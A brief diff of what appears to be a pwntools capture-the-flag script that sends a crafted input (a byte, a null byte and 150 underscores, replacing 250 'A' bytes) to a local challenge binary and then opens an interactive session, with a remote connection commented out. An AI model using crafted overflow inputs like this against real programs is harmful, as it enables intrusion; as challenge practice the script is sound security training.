@@ -5,5 +5,5 @@ p = pwn.process("./static/oppenheimers-research")
 # port = 4444
 # p = remote(host, port)
 
-p.sendline(b'A' * 250)
+p.sendline(b'A\x00' + b'_' * 150)
 p.interactive()
